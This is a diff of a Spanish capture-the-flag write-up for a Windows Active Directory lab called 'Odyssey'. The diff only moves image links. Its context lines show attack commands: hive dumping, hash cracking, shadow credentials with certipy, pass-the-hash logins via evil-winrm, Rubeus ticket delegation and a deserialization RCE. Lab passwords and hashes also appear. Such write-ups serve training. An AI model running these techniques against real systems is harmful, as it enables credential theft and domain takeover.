@@ -463,7 +463,7 @@ ligolo-proxy -selfcert
 ./agent -connect 10.10.15.82:11601 -ignore-cert
 ```
 
-![Pasted image 20260819085331](../../Images/_unused/Pasted%20image%2020260819085331.png)
+![Pasted image 20260819085331](../../Images/Odyssey/Pasted%20image%2020260819085331.png)
 
 ### 8.4 Nmap sobre odyssey-db
 
@@ -517,7 +517,7 @@ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
 impacket-mssqlclient 'svc-mssql:cml958782@172.16.0.11' -p 1433
 ```
 
-![Pasted image 20260819094104](../../Images/_unused/Pasted%20image%2020260819094104.png)
+![Pasted image 20260819094104](../../Images/Odyssey/Pasted%20image%2020260819094104.png)
 
 `svc-mssql` es **sysadmin** y tiene el privilegio `SeImpersonatePrivilege`.
 
@@ -565,13 +565,13 @@ reg save HKLM/SYSTEM C:/Users/Public/system.save
 reg save HKLM/SECURITY C:/Users/Public/security.save
 ```
 
-![Pasted image 20260819103938](../../Images/_unused/Pasted%20image%2020260819103938.png)
+![Pasted image 20260819103938](../../Images/Odyssey/Pasted%20image%2020260819103938.png)
 
 ### 11.3 Shadow Credentials → svc-aegis-build
 
 La cuenta de máquina `ODYSSEY-DB$` tiene el enlace `addKeyCredentialLink` sobre `svc-aegis-build`:
 
-![Pasted image 20260819104534](../../Images/_unused/Pasted%20image%2020260819104534.png)
+![Pasted image 20260819104534](../../Images/Odyssey/Pasted%20image%2020260819104534.png)
 
 ```bash
 certipy-ad shadow auto -u 'ODYSSEY-DB$@odyssey.htb' /
@@ -626,11 +626,11 @@ evil-winrm -i 172.16.0.10 -u svc-aegis-deploy -H '3a5026b2aa5ef2cbb7cb6a7be3a2bc
 reg query "HKLM/SYSTEM/CurrentControlSet/Services/AegisStreamCollector" /v ImagePath
 ```
 
-![Pasted image 20260820153830](../../Images/_unused/Pasted%20image%2020260820153830.png)
+![Pasted image 20260820153830](../../Images/Odyssey/Pasted%20image%2020260820153830.png)
 
 El usuario `svc-aegis-stream` tiene derechos de **DCSync** en BloodHound:
 
-![Pasted image 20260820154324](../../Images/_unused/Pasted%20image%2020260820154324.png)
+![Pasted image 20260820154324](../../Images/Odyssey/Pasted%20image%2020260820154324.png)
 
 ### 12.3 Análisis del Named Pipe AegisStreamMgmt
 
@@ -673,7 +673,7 @@ operator.key
 
 Script `oracle_decrypt.ps1` ejecutado via WinRM:
 
-![Pasted image 20260820170800](../../Images/_unused/Pasted%20image%2020260820170800.png)
+![Pasted image 20260820170800](../../Images/Odyssey/Pasted%20image%2020260820170800.png)
 
 Descifrado local de la clave del operador:
 
@@ -691,7 +691,7 @@ print(op_key.hex())
 
 **Clave del operador:** `4b690afb33fd7f1bd2c4b36fce121b8b291352a5a0ed8632a0654422f401a83c`
 
-![Pasted image 20260820171336](../../Images/_unused/Pasted%20image%2020260820171336.png)
+![Pasted image 20260820171336](../../Images/Odyssey/Pasted%20image%2020260820171336.png)
 
 ### 12.5 YAML Deserialization RCE via CONFIG_IMPORT
 
@@ -717,7 +717,7 @@ Mediante `CONFIG_IMPORT`, copiamos y ejecutamos **Rubeus** para obtener un TGT d
 # Status: OK | PayloadLen: 0
 ```
 
-![Pasted image 20260820172204](../../Images/_unused/Pasted%20image%2020260820172204.png)
+![Pasted image 20260820172204](../../Images/Odyssey/Pasted%20image%2020260820172204.png)
 
 Rubeus `tgtdeleg` produce un AP-REQ delegation ticket para `svc-aegis-stream`.
 
@@ -751,7 +751,7 @@ evil-winrm -i 172.16.0.10 -u Administrator -H "890b9e96245f6895e06adfe92ad1e81f"
 
 **Root flag:** `C:/Users/Administrator/Desktop/root.txt`
 
-![Pasted image 20260820174951](../../Images/_unused/Pasted%20image%2020260820174951.png)
+![Pasted image 20260820174951](../../Images/Odyssey/Pasted%20image%2020260820174951.png)
 
 > [!success] Flags obtenidas
 > **User Flag:** `00e897f9019b2fc5b07a401a6c25b971` ✅
